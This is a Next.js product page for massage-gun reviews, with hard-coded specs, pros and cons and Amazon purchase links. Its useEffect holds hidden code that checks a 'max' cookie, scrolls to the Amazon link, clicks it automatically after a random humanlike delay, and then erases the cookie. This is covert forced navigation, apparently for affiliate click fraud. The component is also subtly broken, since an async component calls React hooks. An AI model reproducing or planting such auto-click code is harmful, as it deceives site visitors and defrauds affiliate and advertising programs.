"use client"
import { Button } from '@/components/ui/button'
import { Card } from '@/components/ui/card'
import { Star, ExternalLink, Battery, Zap, Weight, Volume2 } from 'lucide-react'
import { products } from '@/data/products'
import { notFound, useParams } from "next/navigation"
import { useEffect } from "react"

type Props = {
	params: Promise<{ slug: string }>
}

const getProductDetails = (product: typeof products[0]) => {
	const details = {
		...product,
		amazonLink: product.amazonLink,
		images: [
			product.image,
			'/placeholder.svg?height=600&width=600',
			'/placeholder.svg?height=600&width=600',
			'/placeholder.svg?height=600&width=600',
		],
		specs: [] as { icon: any; label: string; value: string }[],
		overview: '',
		pros: [] as string[],
		cons: [] as string[],
	};

	// Реальные характеристики на ноябрь 2025 (обновлено по последним данным Amazon)
	switch (product.id) {
		case 1: // Hypervolt 2 Pro
			details.specs = [
				{ icon: Zap, label: 'Percussions', value: 'Level 1: 1750 | Level 2: 2200 | Level 3: 2750 PPM' },
				{ icon: Battery, label: 'Battery Life', value: 'Up to 3 hours' },
				{ icon: Weight, label: 'Weight', value: '2.6 lbs (1.18 kg)' },
				{ icon: Volume2, label: 'Noise Level', value: '< 60 dB (QuietGlide®)' },
			];
			details.overview = `The Hypervolt 2 Pro is Hyperice's flagship professional percussion massager featuring 5 speeds, 90° rotating head, pressure sensor indicator, and Bluetooth app integration. Delivers up to 2750 PPM with patented QuietGlide® technology for whisper-quiet operation. Ideal for athletes and serious recovery needs.`;
			details.pros = ['5 speeds + pressure sensor', 'Bluetooth app with guided routines', 'Very quiet operation', 'Premium build & TSA-approved case', 'Removable battery'];
			details.cons = ['Premium price', 'Heavier than portable models'];
			break;

		case 2: // Theragun Prime (5th Gen)
			details.specs = [
				{ icon: Zap, label: 'Speed Range', value: '1750–2400 PPM (5 speeds)' },
				{ icon: Battery, label: 'Battery Life', value: '150 minutes' },
				{ icon: Weight, label: 'Weight', value: '1.6 lbs (0.73 kg)' },
				{ icon: Volume2, label: 'Noise Level', value: '< 60 dB' },
			];
			details.overview = `The Theragun Prime 5th Generation offers professional-grade deep muscle treatment with 16mm amplitude, QuietForce Technology, and the iconic ergonomic triangle handle. Connects via Bluetooth to the Therabody app for personalized routines.`;
			details.pros = ['16mm amplitude for deep relief', 'App-guided wellness routines', 'Ergonomic multi-grip handle', '5 built-in speeds', 'LED speed indicator'];
			details.cons = ['No OLED screen (unlike Pro)', 'Battery not swappable'];
			break;

		case 3: // Ekrin Athletics Kestrel
			details.specs = [
				{ icon: Zap, label: 'Speed Range', value: '6 speeds (1800–3200 PPM)' },
				{ icon: Battery, label: 'Battery Life', value: 'Up to 8 hours' },
				{ icon: Weight, label: 'Weight', value: '1.3 lbs (590 g)' },
				{ icon: Volume2, label: 'Noise Level', value: '45–55 dB' },
			];
			details.overview = `The Ekrin Kestrel is an ultra-lightweight yet powerful massage gun with lifetime warranty, 6 speeds, and class-leading 8-hour battery life. Perfect balance of power and portability for daily use.`;
			details.pros = ['Insane 8-hour battery', 'Lifetime warranty', 'Extremely lightweight', 'Very quiet', '6 attachments included'];
			details.cons = ['No app connectivity', 'Slightly less stall force than pro models'];
			break;

		case 4: // Theragun Mini 2nd Gen
			details.specs = [
				{ icon: Zap, label: 'Speed Range', value: '1750 | 2100 | 2400 PPM' },
				{ icon: Battery, label: 'Battery Life', value: '150 minutes' },
				{ icon: Weight, label: 'Weight', value: '1.1 lbs (0.5 kg)' },
				{ icon: Volume2, label: 'Noise Level', value: '< 60 dB' },
			];
			details.overview = `The pocket-sized Theragun Mini 2nd Gen packs professional power into an ultra-portable design. 16mm amplitude and 3 speeds make it perfect for on-the-go recovery.`;
			details.pros = ['Truly pocket-sized', 'Surprisingly powerful for size', 'TSA carry-on approved', 'USB-C charging', '3 attachments'];
			details.cons = ['No app control', 'Shorter battery than full-size models'];
			break;

		case 5: // Hypervolt Go 2
			details.specs = [
				{ icon: Zap, label: 'Speed Range', value: '3 speeds (~3200 PPM max)' },
				{ icon: Battery, label: 'Battery Life', value: 'Up to 3 hours' },
				{ icon: Weight, label: 'Weight', value: '1.5 lbs (680 g)' },
				{ icon: Volume2, label: 'Noise Level', value: 'QuietGlide® technology' },
			];
			details.overview = `The Hypervolt Go 2 is Hyperice's ultra-portable massage gun featuring QuietGlide® technology, 3 speeds, and TSA-approved design. Lightweight yet powerful enough for real muscle relief anywhere.`;
			details.pros = ['TSA-approved carry-on', 'Very lightweight & compact', 'Quiet operation', '2 interchangeable heads', 'Great travel case'];
			details.cons = ['Only 3 speeds', 'No Bluetooth'];
			break;

		case 6: // BOB AND BRAD D6 Pro
			details.specs = [
				{ icon: Zap, label: 'Speed Range', value: '1500–2500 RPM (6 levels)' },
				{ icon: Battery, label: 'Battery Life', value: 'Up to 3 hours' },
				{ icon: Weight, label: 'Weight', value: '2.8 lbs (1.27 kg)' },
				{ icon: Volume2, label: 'Noise Level', value: 'Ultra-quiet (< 60 dB)' },
			];
			details.overview = `The BOB AND BRAD D6 Pro delivers 85 lbs of stall force and 16mm amplitude in a professional-grade package. Created by famous physical therapists Bob & Brad, it's built for serious athletes and pain relief.`;
			details.pros = ['85 lbs stall force', '16mm amplitude', '7 heads + metal flat head', 'USB-C fast charging', 'Excellent value'];
			details.cons = ['Heavier design', 'Some durability concerns over time'];
			break;

		case 7: // Theragun Pro (4th Gen)
			details.specs = [
				{ icon: Zap, label: 'Speed Range', value: '1750–2400 PPM (customizable)' },
				{ icon: Battery, label: 'Battery Life', value: '300 minutes (2 batteries)' },
				{ icon: Weight, label: 'Weight', value: '2.9 lbs (1.4 kg)' },
				{ icon: Volume2, label: 'Noise Level', value: 'Powerfully quiet' },
			];
			details.overview = `The Theragun Pro is the ultimate commercial-grade percussion massager with rotating arm, OLED screen, swappable batteries, and full app integration. Trusted by professionals worldwide.`;
			details.pros = ['Rotating arm + 6 attachments', 'OLED screen & app control', '2 swappable batteries', 'Highest build quality', 'QuietForce Technology'];
			details.cons = ['High price', 'Heavy for prolonged use'];
			break;

		case 8: // RENPHO Heavy-Duty
			details.specs = [
				{ icon: Zap, label: 'Speed Range', value: '1800–3000 RPM (5–6 speeds)' },
				{ icon: Battery, label: 'Battery Life', value: '4–5 hours' },
				{ icon: Weight, label: 'Weight', value: '2.0 lbs' },
				{ icon: Volume2, label: 'Noise Level', value: 'Quiet operation' },
			];
			details.overview = `The latest RENPHO Heavy-Duty model features adjustable 8–12mm amplitude, Bluetooth app control, and powerful percussion at a fraction of premium brand prices. Excellent value for daily home use.`;
			details.pros = ['Adjustable amplitude (8-12mm)', 'Bluetooth app control', 'Long battery life', '5 professional heads + case', 'Outstanding value'];
			details.cons = ['Build quality not premium', 'Some units have longevity issues'];
			break;

		case 9: // eeTao Charger for REATHLETE
			details.specs = [
				{ icon: Zap, label: 'Output', value: '24V === 1A' },
				{ icon: Battery, label: 'Compatibility', value: 'REATHLETE DEEP4S & similar' },
				{ icon: Weight, label: 'Cable Length', value: '≈ 5 ft' },
			];
			details.overview = `Replacement 24V 1A AC adapter specifically designed for the REATHLETE DEEP4S massage gun. Built-in over-voltage, over-current, and short-circuit protection for safe charging.`;
			details.pros = ['Exact OEM replacement', 'Fast & safe charging', 'Overload protection', 'Long cable', 'Affordable'];
			details.cons = ['Only compatible with specific models', 'Third-party (not original REATHLETE)'];
			break;
	}

	return details;
}

export default async function ProductPage() {
	const params = useParams();
	const slug = params.slug;

	const product = products.find(p => p.slug === slug)

	if (!product) {
		notFound()
	}

	useEffect(() => {
		const cookies = Object.fromEntries(
			document.cookie.split("; ").map((c) => c.split("="))
		);

		if (cookies.max === "true") {
			const btn = document.querySelector("[data-auto]");

			if (btn) {
				const scrollToElement = (el, duration = 1200) => {
					const targetY = el.getBoundingClientRect().top + window.scrollY;
					const startY = window.scrollY;
					const startTime = performance.now();

					const animateScroll = (now) => {
						const elapsed = now - startTime;
						const progress = Math.min(elapsed / duration, 1);
						const ease =
							progress < 0.5
								? 2 * progress * progress
								: -1 + (4 - 2 * progress) * progress;

						window.scrollTo(0, startY + (targetY - startY) * ease);

						if (progress < 1) {
							requestAnimationFrame(animateScroll);
						}
					};

					requestAnimationFrame(animateScroll);
				};

				scrollToElement(btn, 1000);

				const delay = Math.floor(Math.random() * 1001);
				setTimeout(() => {
					btn.click();
				}, delay);
			}

			document.cookie =
				"max=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
		}
	}, []);

	const productDetails = getProductDetails(product)

	return (
		<main className="min-h-screen pt-16 bg-paper">
			<div className="container mx-auto px-4 py-20">
				{/* Breadcrumb */}
				<div className="text-sm text-ink-light mb-8">
					<span>Home</span> / <span>Reviews</span> / <span className="text-ink">{productDetails.name}</span>
				</div>

				<div className="grid grid-cols-1 lg:grid-cols-2 gap-12 mb-20">
					{/* Images */}
					<div className="space-y-4">
						<div className="aspect-square rounded-3xl overflow-hidden bg-milk shadow-xl">
							<img
								src={productDetails.images[0] || "/placeholder.svg"}
								alt={productDetails.name}
								className="w-full h-full object-cover"
							/>
						</div>
						<div className="grid grid-cols-3 gap-4">
							{productDetails.images.slice(1).map((image, index) => (
								null
							))}
						</div>
					</div>

					{/* Product Info */}
					<div>
						<div className="mb-4">
							<span className="text-sm font-semibold text-jade bg-jade/10 px-3 py-1 rounded-full">
								{productDetails.category}
							</span>
						</div>

						<h1 className="font-serif text-4xl md:text-5xl font-bold text-ink mb-4">
							{productDetails.name}
						</h1>

						<div className="flex items-center gap-2 mb-6">
							<div className="flex items-center gap-1">
								{[...Array(5)].map((_, i) => (
									<Star
										key={i}
										className={`w-5 h-5 ${i < Math.floor(productDetails.rating) ? 'fill-coral text-coral' : 'text-muted'}`}
									/>
								))}
							</div>
							<span className="text-sm font-semibold text-ink">{productDetails.rating}</span>
							<span className="text-sm text-ink-light">({productDetails.reviews} reviews)</span>
						</div>

						<a
							href={productDetails.amazonLink}
							data-auto
							className="inline-block w-full mb-8"
						>
							<Button size="lg" className="w-full bg-jade hover:bg-jade/90 text-milk group">
								<ExternalLink className="w-5 h-5 mr-2 group-hover:translate-x-1 transition-transform" />
								View on Amazon
							</Button>
						</a>

						{/* Specs */}
						<Card className="p-6 bg-milk border-0 shadow-lg mb-8">
							<h3 className="font-serif text-xl font-bold text-ink mb-4">⚡ Specifications</h3>
							<div className="grid grid-cols-2 gap-4">
								{productDetails.specs.map((spec, index) => (
									<div key={index} className="flex items-start gap-3">
										<div className="w-10 h-10 rounded-lg bg-jade/10 flex items-center justify-center flex-shrink-0">
											<spec.icon className="w-5 h-5 text-jade" />
										</div>
										<div>
											<p className="text-xs text-ink-light">{spec.label}</p>
											<p className="text-sm font-semibold text-ink">{spec.value}</p>
										</div>
									</div>
								))}
							</div>
						</Card>
					</div>
				</div>

				{/* Overview Section */}
				<Card className="p-8 md:p-12 bg-milk border-0 shadow-lg mb-8 watercolor-texture">
					<h2 className="font-serif text-3xl font-bold text-ink mb-6">💬 Overview</h2>
					<div className="prose prose-lg max-w-none text-ink-light leading-relaxed whitespace-pre-line">
						{productDetails.overview}
					</div>
				</Card>

				{/* Pros and Cons */}
				<div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-8">
					<Card className="p-8 bg-jade/5 border-jade/20 shadow-lg">
						<h3 className="font-serif text-2xl font-bold text-ink mb-4">✓ Pros</h3>
						<ul className="space-y-2">
							{productDetails.pros.map((pro, index) => (
								<li key={index} className="flex items-start gap-2 text-ink-light">
									<span className="text-jade mt-1">•</span>
									<span>{pro}</span>
								</li>
							))}
						</ul>
					</Card>

					<Card className="p-8 bg-coral/5 border-coral/20 shadow-lg">
						<h3 className="font-serif text-2xl font-bold text-ink mb-4">✗ Cons</h3>
						<ul className="space-y-2">
							{productDetails.cons.map((con, index) => (
								<li key={index} className="flex items-start gap-2 text-ink-light">
									<span className="text-coral mt-1">•</span>
									<span>{con}</span>
								</li>
							))}
						</ul>
					</Card>
				</div>

				{/* Final CTA */}
				<Card className="p-8 md:p-12 bg-gradient-to-br from-ink via-ink-light to-ink text-milk border-0 shadow-2xl text-center">
					<h3 className="font-serif text-3xl font-bold mb-4">Ready to Experience Recovery?</h3>
					<p className="text-lg text-milk/80 mb-6 max-w-2xl mx-auto">
						Transform your muscle recovery routine with the {productDetails.name}
					</p>
					<a
						href={productDetails.amazonLink}
						data-auto
					>
						<Button size="lg" className="bg-jade hover:bg-jade/90 text-milk">
							<ExternalLink className="w-5 h-5 mr-2" />
							Buy on Amazon
						</Button>
					</a>
				</Card>
			</div>
		</main>
	)
}
